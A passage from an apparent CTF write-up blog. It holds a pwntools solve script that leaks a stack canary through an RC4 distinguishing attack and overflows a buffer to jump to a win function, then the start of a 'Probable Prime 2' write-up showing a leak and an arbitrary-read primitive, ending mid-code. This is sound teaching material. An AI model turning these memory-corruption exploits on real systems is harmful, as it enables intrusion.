</code></pre></div></div>

<h5 id="ret2win">ret2win</h5>

<p>With the canary leaked, we can perform a buffer overflow and avoid stack smashing. The program has a secret menu option <code class="language-plaintext highlighter-rouge">1337</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">menu_choice</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Leaving already? Enter feedback:</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">);</span>
    <span class="n">pcVar1</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">local_108</span><span class="p">,</span><span class="mi">288</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Here, the program reads in 288 bytes into the 240 byte buffer. This allows us to execute a ropchain to jump to the address of the win function, which is leaked on program startup:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">248</span>  <span class="c1"># Overwrite input buffer + offset
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>    <span class="c1"># Write canary to avoid stack smashing
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>    <span class="c1"># Overwrite saved RBP
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>  <span class="c1"># Set instruction pointer (rip) to the address of win()
</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1337"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Win: 0x570eb47344f0
Recovered canary byte: 0x2c
Recovered canary byte: 0x66
Recovered canary byte: 0xd0
Recovered canary byte: 0x2d
Recovered canary byte: 0x72
Recovered canary byte: 0x71
Recovered canary byte: 0x78
canary = 0x7871722dd0662c00
EPT{local_test_flag_because_im_not_waiting_100_years_on_remote_again_:skull:}
</code></pre></div></div>

<p>Since we must collect many ciphertext samples from the program for the distinguishing attack, the program runs for a long time against the remote due to a lot of extra overhead.</p>

<h5 id="solvepy">solve.py</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./encryptor"</span><span class="p">)</span>
<span class="c1">#p = remote("encryptor-pwn.ept.gg", 1337, ssl=True)
</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"at "</span><span class="p">)</span>
<span class="n">win</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Win:"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">win</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Encrypted: "</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">reset_key</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Encrypted: "</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">recover_canary_byte</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">240</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="mh">0xF7</span> <span class="o">+</span> <span class="n">i</span><span class="p">)))</span>
    <span class="n">cnt</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6000</span><span class="p">):</span>
        <span class="n">ct_line</span> <span class="o">=</span> <span class="n">reset_key</span><span class="p">()</span>
        <span class="n">b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ct_line</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
        <span class="n">cnt</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Recovered canary byte: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">cnt</span><span class="p">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">cnt</span><span class="p">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>

<span class="n">canary</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">recover_canary_byte</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"canary = 0x</span><span class="si">{</span><span class="n">canary</span><span class="p">[</span><span class="si">::</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">248</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1337"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="RC4" /><category term="Distinguishing Attack" /><category term="Pwn" /><summary type="html"><![CDATA[Challenge overview]]></summary></entry><entry><title type="html">Probable Prime 2 (WackAttack CTF 2025)</title><link href="https://zukane.github.io/probable-prime-2/" rel="alternate" type="text/html" title="Probable Prime 2 (WackAttack CTF 2025)" /><published>2025-10-05T16:00:00+02:00</published><updated>2025-10-05T16:00:00+02:00</updated><id>https://zukane.github.io/probable-prime-2</id><content type="html" xml:base="https://zukane.github.io/probable-prime-2/"><![CDATA[<h5 id="challenge-overview">Challenge overview</h5>

<p>In this CTF challenge, we are given a Linux binary that acts as a simple database for prime numbers. The binary presents a menu with four options:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the wack prime database
Sadly we just lost all our primes, so we need help adding some new primes
What do you want to do?
1 Add a prime
2 Edit a primename or description
3 Showcase a prime
4 Factor a prime
&gt; 
</code></pre></div></div>

<p>The flag is revealed after successfully factoring one of the numbers stored in the database. The program checks if submitted numbers are prime, and the factoring function explicitly rejects trivial factors (1 and -1), making it impossible to factor a true prime. This immediately suggests that we must find a way to add a composite number that the binary’s primality test accepts as prime. This requires finding and exploiting flaws in both the binary’s memory safety and its cryptographic implementation.</p>

<h5 id="reverse-engineering">Reverse engineering</h5>

<p>The binary begins by calling the <code class="language-plaintext highlighter-rouge">init()</code> function:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">init</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">){</span>
  <span class="p">[...]</span>
  <span class="n">__gmpz_init_set_str</span><span class="p">(</span><span class="n">local_c8</span><span class="p">,</span><span class="s">"6364136223846793005"</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
  <span class="n">__gmp_randinit_lc_2exp</span><span class="p">(</span><span class="n">st</span><span class="p">,</span><span class="n">local_c8</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x400</span><span class="p">);</span>
  <span class="n">__gmpz_init</span><span class="p">(</span><span class="n">k</span><span class="p">);</span>
  <span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The function initializes an LCG using GMP’s <code class="language-plaintext highlighter-rouge">__gmp_randinit_lc_2exp</code> with parameters $A = 6364136223846793005, C = 1$ and a modulus of $2^{1024}-1$, which is stored in the global variable <code class="language-plaintext highlighter-rouge">st</code>. Afterwards, a 25-bit random integer $k$ is generated, as well as the 1024-bit state $X$</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">init</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">){</span>
  <span class="p">[...]</span>
      <span class="n">__gmpz_init</span><span class="p">(</span><span class="n">X</span><span class="p">);</span>
      <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x11</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">__gmpz_urandomb</span><span class="p">(</span><span class="n">X</span><span class="p">,</span><span class="n">st</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">__gmpz_urandomb</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">st</span><span class="p">,</span><span class="mh">0x19</span><span class="p">);</span>
  <span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The function <code class="language-plaintext highlighter-rouge">prime_checker()</code> implements a Miller-Rabin primality checker with 6 rounds. The random bases are generated using the <code class="language-plaintext highlighter-rouge">__gmpz_urandomm()</code> function. This means it generates a random number using the global RNG state <code class="language-plaintext highlighter-rouge">st</code> and the global integer <code class="language-plaintext highlighter-rouge">k</code> as an upper bound.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">prime_checker</span><span class="p">(</span><span class="kt">long</span> <span class="n">param_1</span><span class="p">){</span>
	<span class="p">[...]</span>
	<span class="n">__gmpz_urandomm</span><span class="p">(</span><span class="n">base</span><span class="p">,</span><span class="n">st</span><span class="p">,</span><span class="n">k</span><span class="p">);</span>
	<span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Miller-Rabin primality checks are not completely reliable, as there exists <code class="language-plaintext highlighter-rouge">Strong Pseudoprimes</code> which are composite numbers that pass the Miller-Rabin primality test with respect to some bases. To get the flag, we could generate one such pseudoprime to bypass the <code class="language-plaintext highlighter-rouge">prime_checker()</code> function, and then factor it with our known factors. However, we must be able to predict the binary’s generated bases. To predict the generated bases, we must retrieve the values of $k$ and $X$ from the binary and copy the PRNG.</p>

<h5 id="leaking-the-state">Leaking the state</h5>

<p>When a new prime is added, the program reads the description using <code class="language-plaintext highlighter-rouge">fgets</code>, finds its length with <code class="language-plaintext highlighter-rouge">strlen</code>, and then manually appends a newline character. This logic is flawed:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">){</span>
	<span class="p">[...]</span>
	<span class="n">__gmpz_set</span><span class="p">(</span><span class="n">auStack_978</span> <span class="o">+</span> <span class="n">local_b20</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">,</span><span class="n">local_b18</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">);</span>
	<span class="n">pcVar2</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">acStack_968</span> <span class="o">+</span> <span class="n">local_b20</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
	<span class="p">[...]</span>
		<span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">acStack_968</span> <span class="o">+</span> <span class="n">local_b20</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">);</span>
		<span class="n">acStack_968</span><span class="p">[</span><span class="n">sVar3</span> <span class="o">+</span> <span class="n">local_b20</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\n'</span><span class="p">;</span>
		<span class="n">local_b20</span> <span class="o">=</span> <span class="p">(</span><span class="n">local_b20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1e</span><span class="p">;</span>
	<span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Here, <code class="language-plaintext highlighter-rouge">fgets</code> reads up to 58 bytes (57 character and a null-terminator). We can trigger the bug by providing a description that is exactly 57 characters long, with no trailing newline:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">fgets</code> reads our 57 characters and, seeing no newline, appends a null-terminator <code class="language-plaintext highlighter-rouge">\x00</code> at index 57.</li>
  <li><code class="language-plaintext highlighter-rouge">strlen</code> is called on the buffer, and returns 57.</li>
  <li>The program runs <code class="language-plaintext highlighter-rouge">description_buffer[57] = '\n'</code> which overwrites the null-terminator with a newline character.
By using the “showcase prime” option in the menu on the corrupted entry, the program will call <code class="language-plaintext highlighter-rouge">printf("%s",...)</code> and continue to print data until it eventually finds a null-byte.</li>
</ul>

<p>The data located on the stack after the description buffer happens to be the array that stores pointers to the prime names. We can create a second prime entry without providing a name, so the program assigns it a default name by storing a pointer to a global variable <code class="language-plaintext highlighter-rouge">default_name</code>. This global <code class="language-plaintext highlighter-rouge">default_name</code> variable resides in the <code class="language-plaintext highlighter-rouge">.bss</code> section of the binary.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">create_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"leak"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"13"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">57</span><span class="p">)</span>
<span class="n">create_prime</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sa">b</span><span class="s">"11"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"asdf"</span><span class="p">)</span>
<span class="n">prime</span><span class="p">,</span> <span class="n">desc</span> <span class="o">=</span> <span class="n">showcase_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">desc</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
<span class="n">bss_leak</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span>
</code></pre></div></div>

<p>We can then leak the base address of the PIE executable:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">bss_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x6150</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"PIE = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>With the base address, we can create an arbitrary write primitive. The prime entries consist of a name, a prime number, and an optional description:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">prime_ent</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">m_pName</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">_0x0004</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">prime</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">description</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The description is stored in a 48 byte buffer. However, when editing the description of an existing prime, 58 bytes are read into the buffer:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">){</span>
	<span class="p">[...]</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">);</span>
    <span class="n">pcVar2</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">acStack_968</span> <span class="o">+</span> <span class="n">CONCAT44</span><span class="p">(</span><span class="n">uStack_b24</span><span class="p">,</span><span class="n">local_b28</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
	<span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We can use this overflow to overwrite the name of an adjacent prime entry in the database. This gives us an arbitrary read, as we can send a payload of <code class="language-plaintext highlighter-rouge">b"A"*48 + p64(target_address)</code> to entry 0’s description, which overwrites entry 1’s name to <code class="language-plaintext highlighter-rouge">p64(target_address)</code>. When showcasing this entry later, the program calls <code class="language-plaintext highlighter-rouge">printf("%s", m_pName)</code>. Since <code class="language-plaintext highlighter-rouge">m_pName</code> now holds the target address we supplied, <code class="language-plaintext highlighter-rouge">printf</code> begins reading bytes from that location in memory and sends them back to us.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak_add</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
    <span class="n">edit_description</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">))</span>
    <span class="n">name_leak</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">showcase_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">leaked_prefix</span> <span class="o">=</span> <span class="n">name_leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">leaked_prefix</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">9</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div></div>

<p>We use this arbitrary read to leak the values of $k$ and $X$, which are contained within the object <code class="language-plaintext highlighter-rouge">st</code>. <code class="language-plaintext highlighter-rouge">st</code> is structured as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/8gx &amp;st
0x55f038d5d180 &lt;st&gt;:    0x0000000000000000      0x000055f0393152c0 &lt;- algdata pointer
0x55f038d5d190 &lt;st+16&gt;: 0x0000000000000000      0x00007fa5f5e6bbe0
0x55f038d5d1a0 &lt;k&gt;:     0x0000000100000001      0x000055f039315440 &lt;- k pointer
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/32gx 0x000055f0393152c0
0x55f0393152c0: 0x0000001000000010      0x000055f039315300 # &lt;- X pointer
0x55f0393152d0: 0x0000000100000001      0x000055f039315390
0x55f0393152e0: 0x0000000000000001      0x0000000000000001
0x55f0393152f0: 0x0000000000000400      0x0000000000000091 # &lt;- 0x400 = 1024 bit-size
0x55f039315300: 0xecac3f17450b1e56      0xcfd2a64548f2e35c # &lt;- X is here
0x55f039315310: 0x9ca3c08925695bcf      0xa7a71d64ebf073cb
0x55f039315320: 0x88e98595174a6964      0x07a3f69c34ec83bc
0x55f039315330: 0x416760bd066590af      0x4d5b571b50e6a95b
0x55f039315340: 0xcdd12d48238d3608      0x8f9914b302e0967a
0x55f039315350: 0xfb0302810f366862      0xfbb371fcae55b7b7
0x55f039315360: 0x140c017107775d37      0x7d86f2f23316cc7f
0x55f039315370: 0x17e984772c9c5dbd      0x50b9e2235dc0df41
</code></pre></div></div>

<p>So, we can retrieve the values of $k$ and $X$ from the binary:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">k_addr</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">k</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
<span class="n">k</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">k_addr</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"k = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">k</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">algdata_ptr</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">st</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"algdata_ptr  = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">algdata_ptr</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">x_ptr</span> <span class="o">=</span> <span class="n">algdata_ptr</span> <span class="o">+</span> <span class="mi">64</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"x_ptr  = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">x_ptr</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">chunks</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">chunks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">leak_add</span><span class="p">(</span><span class="n">x_ptr</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>

<span class="n">Xbytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>
<span class="k">assert</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">Xbytes</span>
<span class="n">X</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">Xbytes</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Leaked 1024-bit state X = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Since our leak relies on overwriting <code class="language-plaintext highlighter-rouge">\x00</code> with <code class="language-plaintext highlighter-rouge">\n</code>, any address or value we leak cannot contain <code class="language-plaintext highlighter-rouge">\x00</code>. Therefore, we must rerun the attack until the leaked values do not contain a null-byte.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PIE = 0x55f038d57000
k = 0x46ed81
algdata_ptr  = 0x55f0393152c0
x_ptr  = 0x55f039315300
Leaked 1024-bit state X = 0x50b9e2235dc0df4117e984772c9c5dbd7d86f2f23316cc7f140c017107775d37fbb371fcae55b7b7fb0302810f3668628f9914b302e0967acdd12d48238d36084d5b571b50e6a95b416760bd066590af07a3f69c34ec83bc88e98595174a6964a7a71d64ebf073cb9ca3c08925695bcfcfd2a64548f2e35cecac3f17450b1e56
</code></pre></div></div>

<h5 id="predicting-the-bases">Predicting the bases</h5>

<p>With $k$ and $X$ leaked from the binary, we can recreate the PRNG locally to generate the 6 bases used in the Miller-Rabin primality check. We can recreate the <code class="language-plaintext highlighter-rouge">__gmp_randinit_lc_2exp</code> LCG locally, and, with some reverse-engineering and lucky prompts, recreate GMP’s <code class="language-plaintext highlighter-rouge">__gmpz_urandomm()</code> function:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">A</span> <span class="o">=</span> <span class="mh">0x5851f42d4c957f2d</span>
<span class="n">C</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">MASK1024</span>  <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="mi">1024</span> <span class="o">-</span> <span class="mi">1</span>
<span class="n">HALF_BITS</span> <span class="o">=</span> <span class="mi">512</span>
<span class="n">HALF_MASK</span> <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="n">HALF_BITS</span> <span class="o">-</span> <span class="mi">1</span>

<span class="k">class</span> <span class="nc">LCG1024</span><span class="p">:</span>
